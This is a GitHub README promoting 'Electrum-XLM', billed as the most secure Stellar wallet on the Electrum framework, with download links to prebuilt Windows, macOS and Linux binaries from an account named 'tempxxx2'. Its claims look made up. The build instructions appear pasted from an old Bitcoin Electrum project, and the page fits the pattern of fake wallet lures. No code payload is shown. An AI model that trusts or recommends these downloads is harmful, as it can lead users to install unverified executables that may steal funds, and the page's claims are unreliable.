[![License](https://img.shields.io/badge/License-GNU%20GPL%20v3-2E8B57?style=for-the-badge&logo=github)](https://github.com/tempxxx2/Electrum-XLM/blob/master/LICENCE)
[![Release](https://img.shields.io/github/release/tempxxx2/Electrum-XLM?style=for-the-badge&logo=github&color=FFC107)](https://github.com/tempxxx2/Electrum-XLM/releases/tag/v.1.4.7)
[![Stellar Blockchain](https://img.shields.io/badge/Blockchain-Stellar-00BCD4?style=for-the-badge&logo=stellar)](https://www.stellar.org/)
[![Open Source](https://img.shields.io/badge/Open%20Source-Yes-purple?style=for-the-badge)](https://github.com/tempxxx2/Electrum-XLM)


# 💎 Electrum-XLM: The Ultimate Secure Stellar Wallet 
<!-- Unique Badges -->

**Electrum-XLM** is the most secure, efficient, and user-friendly wallet for managing your Stellar (XLM) assets, built on the trusted Electrum framework. It empowers users to manage their Stellar assets quickly, securely, and efficiently, all while providing a smooth and intuitive user experience.

---

## 🚀 Download Electrum-XLM

Get the latest version of **Electrum-XLM** for your operating system and start managing your Stellar (XLM) assets today:

### 🌐 **Windows**:
[**Download Electrum-XLM for Windows**](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.exe)

### 🍏 **macOS**:
[**Download Electrum-XLM for macOS**](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.dmg)

### 🐧 **Linux**:
[**Download Electrum-XLM for Linux**](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.AppImage)


---

## 🛠️ Installation Instructions

To install **Electrum-XLM**, follow the steps below:

1. **Clone the repository**:
    ```bash
    git clone https://github.com/tempxxx2/Electrum-XLM.git
    cd Electrum-XLM
    ```

2. **Install dependencies**:
    ```bash
    python -m pip install -r requirements.txt
    ```

3. **Run Electrum-XLM**:
    ```bash
    python electrum-xlm.py
    ```

For system-wide installation, you can run:

```bash
sudo python setup.py install
electrum-xlm
```

---

## 🔧 Building Electrum-XLM from Source

To build **Electrum-XLM** from source, follow the steps below:

1. Clone the repository and navigate to the directory:

```bash
git clone https://github.com/tempxxx2/Electrum-XLM.git
cd Electrum-XLM
```

2. Build the package:

```bash
python mki18n.py
pyrcc4 icons.qrc -o gui/qt/icons_rc.py
python setup.py sdist --format=zip,gztar
```

For **macOS**, follow these steps:

```bash
# For port-based installs
sudo python setup-release.py py2app

# For brew installs
ARCHFLAGS="-arch i386 -arch x86_64" sudo python setup-release.py py2app --includes sip

# Create the DMG package
sudo hdiutil create -fs HFS+ -volname "Electrum-XLM" -srcfolder dist/Electrum-XLM.app dist/electrum-xlm-VERSION-macosx.dmg
```

---

## 💼 Features of Electrum-XLM

- **Fast & Efficient**: Lightning-fast transaction processing while keeping resource usage low.
- **Highly Secure**: With advanced encryption and multi-signature support, your funds are kept safe.
- **Cross-Platform**: Available on Windows, macOS, and Linux.
- **Open Source**: Community-driven, transparent, and open for contributions.
- **User-Friendly Interface**: Clean, intuitive, and simple design for smooth wallet management.

---

## 📄 License

Electrum-XLM is licensed under the [GNU GPL v3 License](https://github.com/tempxxx2/Electrum-XLM/blob/master/LICENCE).

---

For more details, visit our [GitHub repository](https://github.com/tempxxx2/Electrum-XLM).  
Enjoy using **Electrum-XLM** and manage your Stellar assets securely and efficiently!

